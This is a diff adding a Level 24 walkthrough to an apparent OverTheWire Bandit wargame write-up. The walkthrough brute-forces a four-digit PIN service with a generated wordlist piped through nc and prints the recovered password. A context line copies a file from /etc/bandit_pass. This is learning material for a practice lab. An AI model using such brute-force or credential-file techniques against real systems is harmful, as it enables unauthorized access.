@@ -279,3 +279,26 @@ inside myscript.sh
 cp /etc/bandit_pass/bandit24 /tmp/bandit24_pass
 ```
 
+#### Level 24
+A simple brute force program 
+
+```s
+bandit24@bandit:~$ mkdir /tmp/avikki25
+bandit24@bandit:~$ cd /tmp/avikki25
+bandit24@bandit:/tmp/avikki25$ python3 -c "open('data.txt','w').write('\n'.join(['UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ '+str(i).zfill(4) for i in range(0,10000)]))" 
+bandit24@bandit:/tmp/avikki25$ cat data.txt | nc localhost 30002 | grep -v "^W"
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+Timeout. Exiting.
+bandit24@bandit:/tmp/avikki25$ split -l5000 data.txt 
+bandit24@bandit:/tmp/avikki25$ cat xaa | nc localhost 30002 | grep -v "Wrong"
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+Timeout. Exiting.
+bandit24@bandit:/tmp/avikki25$ cat xab | nc localhost 30002 | grep -v "Wrong"
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+Correct!
+The password of user bandit25 is uNG9O58gUE7snukf3xxxxxxxxxxx
+
+Exiting.
+```
+
+#### Level 25
